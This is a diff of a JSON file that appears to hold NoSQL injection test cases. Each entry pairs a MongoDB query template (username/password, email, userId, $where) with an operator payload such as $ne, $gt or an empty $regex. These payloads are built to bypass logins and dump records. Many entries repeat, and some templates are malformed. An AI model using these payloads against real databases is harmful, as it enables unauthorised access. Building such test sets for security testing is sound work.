@@ -1,602 +1,2802 @@
 [
     {
-        "template": "{\"query\": {\"$regex\": \"payload6\"}}",
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
         "payload": "\".*\""
     },
     {
-        "template": "{\"userId\": \"payload8\", \"isAdmin\": false}",
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
         "payload": "{\"$gt\": 0}"
     },
     {
-        "template": "{\"email\": \"payload8\", \"verified\": true}",
+        "template": "{\"email\": \"payload\", \"verified\": true}",
         "payload": "{\"$regex\": \"\"}"
     },
     {
-        "template": "{\"username\": \"payload6\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"query\": {\"$regex\": \"payload4\"}}",
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
         "payload": "\".*\""
     },
     {
-        "template": "{\"userId\": \"payload5\", \"isAdmin\": false}",
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
         "payload": "{\"$gt\": 0}"
     },
     {
-        "template": "{\"username\": \"payload9\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"$where\": \"payload8\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"email\": \"payload6\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
-    },
-    {
-        "template": "{\"username\": \"payload2\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"username\": \"payload5\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"$where\": \"payload6\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"$where\": \"payload9\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"$where\": \"payload5\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"query\": {\"$regex\": \"payload3\"}}",
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
         "payload": "\".*\""
     },
     {
-        "template": "{\"query\": {\"$regex\": \"payload8\"}}",
-        "payload": "\".*\""
-    },
-    {
-        "template": "{\"email\": \"payload4\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
-    },
-    {
-        "template": "{\"email\": \"payload3\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
-    },
-    {
-        "template": "{\"query\": {\"$regex\": \"payload5\"}}",
-        "payload": "\".*\""
-    },
-    {
-        "template": "{\"username\": \"payload8\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"query\": {\"$regex\": \"payload9\"}}",
-        "payload": "\".*\""
-    },
-    {
-        "template": "{\"email\": \"payload2\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
-    },
-    {
-        "template": "{\"query\": {\"$regex\": \"payload2\"}}",
-        "payload": "\".*\""
-    },
-    {
-        "template": "{\"email\": \"payload7\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
-    },
-    {
-        "template": "{\"username\": \"payload3\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"query\": {\"$regex\": \"payload1\"}}",
-        "payload": "\".*\""
-    },
-    {
-        "template": "{\"query\": {\"$regex\": \"payload0\"}}",
-        "payload": "\".*\""
-    },
-    {
-        "template": "{\"username\": \"payload0\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"userId\": \"payload9\", \"isAdmin\": false}",
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
         "payload": "{\"$gt\": 0}"
     },
     {
-        "template": "{\"userId\": \"payload0\", \"isAdmin\": false}",
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
         "payload": "{\"$gt\": 0}"
     },
     {
-        "template": "{\"userId\": \"payload7\", \"isAdmin\": false}",
-        "payload": "{\"$gt\": 0}"
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
     },
     {
-        "template": "{\"query\": {\"$regex\": \"payload7\"}}",
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"letmein\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
         "payload": "\".*\""
     },
     {
-        "template": "{\"$where\": \"payload7\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"$where\": \"payload0\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"email\": \"payload5\", \"verified\": true}",
+        "template": "{\"email\": \"payload\", \"verified\": true}",
         "payload": "{\"$regex\": \"\"}"
     },
     {
-        "template": "{\"username\": \"payload4\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
     },
     {
-        "template": "{\"userId\": \"payload1\", \"isAdmin\": false}",
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
         "payload": "{\"$gt\": 0}"
     },
     {
-        "template": "{\"$where\": \"payload1\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"$where\": \"payload4\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"userId\": \"payload4\", \"isAdmin\": false}",
-        "payload": "{\"$gt\": 0}"
-    },
-    {
-        "template": "{\"userId\": \"payload6\", \"isAdmin\": false}",
-        "payload": "{\"$gt\": 0}"
-    },
-    {
-        "template": "{\"username\": \"payload1\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"username\": \"payload7\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"email\": \"payload1\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
-    },
-    {
-        "template": "{\"userId\": \"payload2\", \"isAdmin\": false}",
-        "payload": "{\"$gt\": 0}"
-    },
-    {
-        "template": "{\"$where\": \"payload2\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"$where\": \"payload3\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"userId\": \"payload3\", \"isAdmin\": false}",
-        "payload": "{\"$gt\": 0}"
-    },
-    {
-        "template": "{\"email\": \"payload9\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
-    },
-    {
-        "template": "{\"email\": \"payload0\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
-    },
-    {
-        "template": "{\"username\": \"payload751\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"username\": \"payload624\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"$where\": \"payload965\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"username\": \"payload670\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"email\": \"payload100\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
-    },
-    {
-        "template": "{\"userId\": \"payload305\", \"isAdmin\": false}",
-        "payload": "{\"$gt\": 0}"
-    },
-    {
-        "template": "{\"username\": \"payload181\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"username\": \"payload780\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"$where\": \"payload750\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"username\": \"payload935\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"$where\": \"payload677\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"query\": {\"$regex\": \"payload664\"}}",
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
         "payload": "\".*\""
     },
     {
-        "template": "{\"$where\": \"payload647\"}",
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
         "payload": "1"
     },
     {
-        "template": "{\"userId\": \"payload452\", \"isAdmin\": false}",
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$gt\": 0}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
         "payload": "{\"$gt\": 0}"
     },
     {
-        "template": "{\"email\": \"payload518\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$regex\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
     },
     {
-        "template": "{\"email\": \"payload661\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
-    },
-    {
-        "template": "{\"$where\": \"payload640\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"email\": \"payload732\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
-    },
-    {
-        "template": "{\"query\": {\"$regex\": \"payload941\"}}",
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
         "payload": "\".*\""
     },
     {
-        "template": "{\"$where\": \"payload997\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"email\": \"payload345\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
-    },
-    {
-        "template": "{\"userId\": \"payload625\", \"isAdmin\": false}",
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
         "payload": "{\"$gt\": 0}"
     },
     {
-        "template": "{\"username\": \"payload801\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"userId\": \"payload494\", \"isAdmin\": false}",
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
         "payload": "{\"$gt\": 0}"
     },
     {
-        "template": "{\"username\": \"payload165\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"$where\": \"payload234\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"username\": \"payload188\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"query\": {\"$regex\": \"payload280\"}}",
-        "payload": "\".*\""
-    },
-    {
-        "template": "{\"query\": {\"$regex\": \"payload975\"}}",
-        "payload": "\".*\""
-    },
-    {
-        "template": "{\"username\": \"payload181\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"$where\": \"payload648\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"userId\": \"payload799\", \"isAdmin\": false}",
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
         "payload": "{\"$gt\": 0}"
     },
     {
-        "template": "{\"email\": \"payload253\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
-    },
-    {
-        "template": "{\"email\": \"payload413\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
-    },
-    {
-        "template": "{\"email\": \"payload293\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
-    },
-    {
-        "template": "{\"query\": {\"$regex\": \"payload589\"}}",
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
         "payload": "\".*\""
     },
     {
-        "template": "{\"query\": {\"$regex\": \"payload304\"}}",
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$regex\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
         "payload": "\".*\""
     },
     {
-        "template": "{\"username\": \"payload914\", \"password\": \"password\"}",
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$where\": \"\"}\"}",
         "payload": "{\"$ne\": \"\"}"
     },
     {
-        "template": "{\"username\": \"payload465\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"userId\": \"payload138\", \"isAdmin\": false}",
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
         "payload": "{\"$gt\": 0}"
     },
     {
-        "template": "{\"query\": {\"$regex\": \"payload538\"}}",
-        "payload": "\".*\""
-    },
-    {
-        "template": "{\"query\": {\"$regex\": \"payload173\"}}",
-        "payload": "\".*\""
-    },
-    {
-        "template": "{\"username\": \"payload747\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"username\": \"payload251\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"$where\": \"payload343\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"email\": \"payload163\", \"verified\": true}",
+        "template": "{\"email\": \"payload\", \"verified\": true}",
         "payload": "{\"$regex\": \"\"}"
     },
     {
-        "template": "{\"username\": \"payload970\", \"password\": \"password\"}",
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$regex\": \"\"}\"}",
         "payload": "{\"$ne\": \"\"}"
     },
     {
-        "template": "{\"query\": {\"$regex\": \"payload331\"}}",
-        "payload": "\".*\""
-    },
-    {
-        "template": "{\"email\": \"payload451\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
-    },
-    {
-        "template": "{\"$where\": \"payload755\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"$where\": \"payload561\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"query\": {\"$regex\": \"payload687\"}}",
-        "payload": "\".*\""
-    },
-    {
-        "template": "{\"query\": {\"$regex\": \"payload334\"}}",
-        "payload": "\".*\""
-    },
-    {
-        "template": "{\"query\": {\"$regex\": \"payload767\"}}",
-        "payload": "\".*\""
-    },
-    {
-        "template": "{\"username\": \"payload193\", \"password\": \"password\"}",
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$ne\": \"\"}\"}",
         "payload": "{\"$ne\": \"\"}"
     },
     {
-        "template": "{\"email\": \"payload556\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
-    },
-    {
-        "template": "{\"username\": \"payload428\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"email\": \"payload543\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
-    },
-    {
-        "template": "{\"$where\": \"payload508\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"query\": {\"$regex\": \"payload276\"}}",
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
         "payload": "\".*\""
     },
     {
-        "template": "{\"userId\": \"payload380\", \"isAdmin\": false}",
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
         "payload": "{\"$gt\": 0}"
     },
     {
-        "template": "{\"userId\": \"payload992\", \"isAdmin\": false}",
-        "payload": "{\"$gt\": 0}"
-    },
-    {
-        "template": "{\"query\": {\"$regex\": \"payload853\"}}",
-        "payload": "\".*\""
-    },
-    {
-        "template": "{\"$where\": \"payload184\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"userId\": \"payload925\", \"isAdmin\": false}",
-        "payload": "{\"$gt\": 0}"
-    },
-    {
-        "template": "{\"email\": \"payload666\", \"verified\": true}",
+        "template": "{\"email\": \"payload\", \"verified\": true}",
         "payload": "{\"$regex\": \"\"}"
     },
     {
-        "template": "{\"email\": \"payload270\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
-    },
-    {
-        "template": "{\"userId\": \"payload829\", \"isAdmin\": false}",
-        "payload": "{\"$gt\": 0}"
-    },
-    {
-        "template": "{\"email\": \"payload861\", \"verified\": true}",
-        "payload": "{\"$regex\": \"\"}"
-    },
-    {
-        "template": "{\"$where\": \"payload353\"}",
+        "template": "{\"$where\": \"payload\"}",
         "payload": "1"
     },
     {
-        "template": "{\"username\": \"payload181\", \"password\": \"password\"}",
+        "template": "{\"username\": \"payload\", \"password\": \"admin\"}",
         "payload": "{\"$ne\": \"\"}"
     },
     {
-        "template": "{\"$where\": \"payload180\"}",
-        "payload": "1"
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
     },
     {
-        "template": "{\"query\": {\"$regex\": \"payload709\"}}",
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
         "payload": "\".*\""
     },
     {
-        "template": "{\"username\": \"payload831\", \"password\": \"password\"}",
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
         "payload": "{\"$ne\": \"\"}"
     },
     {
-        "template": "{\"query\": {\"$regex\": \"payload696\"}}",
-        "payload": "\".*\""
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$gt\": 0}\"}",
+        "payload": "{\"$ne\": \"\"}"
     },
     {
-        "template": "{\"email\": \"payload323\", \"verified\": true}",
+        "template": "{\"email\": \"payload\", \"verified\": true}",
         "payload": "{\"$regex\": \"\"}"
     },
     {
-        "template": "{\"query\": {\"$regex\": \"payload220\"}}",
-        "payload": "\".*\""
-    },
-    {
-        "template": "{\"userId\": \"payload120\", \"isAdmin\": false}",
-        "payload": "{\"$gt\": 0}"
-    },
-    {
-        "template": "{\"$where\": \"payload106\"}",
+        "template": "{\"$where\": \"payload\"}",
         "payload": "1"
     },
     {
-        "template": "{\"$where\": \"payload751\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"email\": \"payload741\", \"verified\": true}",
+        "template": "{\"email\": \"payload\", \"verified\": true}",
         "payload": "{\"$regex\": \"\"}"
     },
     {
-        "template": "{\"userId\": \"payload105\", \"isAdmin\": false}",
-        "payload": "{\"$gt\": 0}"
-    },
-    {
-        "template": "{\"$where\": \"payload776\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"$where\": \"payload304\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"query\": {\"$regex\": \"payload476\"}}",
-        "payload": "\".*\""
-    },
-    {
-        "template": "{\"username\": \"payload996\", \"password\": \"password\"}",
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$regex\": \"\"}\"}",
         "payload": "{\"$ne\": \"\"}"
     },
     {
-        "template": "{\"query\": {\"$regex\": \"payload942\"}}",
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
         "payload": "\".*\""
     },
     {
-        "template": "{\"userId\": \"payload795\", \"isAdmin\": false}",
-        "payload": "{\"$gt\": 0}"
-    },
-    {
-        "template": "{\"$where\": \"payload745\"}",
-        "payload": "1"
-    },
-    {
-        "template": "{\"userId\": \"payload807\", \"isAdmin\": false}",
-        "payload": "{\"$gt\": 0}"
-    },
-    {
-        "template": "{\"username\": \"payload435\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"query\": {\"$regex\": \"payload920\"}}",
-        "payload": "\".*\""
-    },
-    {
-        "template": "{\"username\": \"payload256\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
-    },
-    {
-        "template": "{\"userId\": \"payload703\", \"isAdmin\": false}",
-        "payload": "{\"$gt\": 0}"
-    },
-    {
-        "template": "{\"email\": \"payload111\", \"verified\": true}",
+        "template": "{\"email\": \"payload\", \"verified\": true}",
         "payload": "{\"$regex\": \"\"}"
     },
     {
-        "template": "{\"email\": \"payload352\", \"verified\": true}",
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
         "payload": "{\"$regex\": \"\"}"
     },
     {
-        "template": "{\"username\": \"payload876\", \"password\": \"password\"}",
-        "payload": "{\"$ne\": \"\"}"
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
     },
     {
-        "template": "{\"userId\": \"payload111\", \"isAdmin\": false}",
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
         "payload": "{\"$gt\": 0}"
     },
     {
-        "template": "{\"$where\": \"payload505\"}",
+        "template": "{\"username\": \"payload\", \"password\": \"123456\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"123456\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$regex\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
         "payload": "1"
     },
     {
-        "template": "{\"username\": \"payload280\", \"password\": \"password\"}",
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
         "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"password\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$where\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"admin\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"pass123\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$where\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$ne\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$regex\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$ne\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"email\": \"payload\", \"verified\": true}",
+        "payload": "{\"$regex\": \"\"}"
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"userId\": \"payload\", \"isAdmin\": false}",
+        "payload": "{\"$gt\": 0}"
+    },
+    {
+        "template": "{\"username\": \"payload\", \"password\": \"{\"$ne\": \"\"}\"}",
+        "payload": "{\"$ne\": \"\"}"
+    },
+    {
+        "template": "{\"query\": {\"$regex\": \"payload\"}}",
+        "payload": "\".*\""
+    },
+    {
+        "template": "{\"$where\": \"payload\"}",
+        "payload": "1"
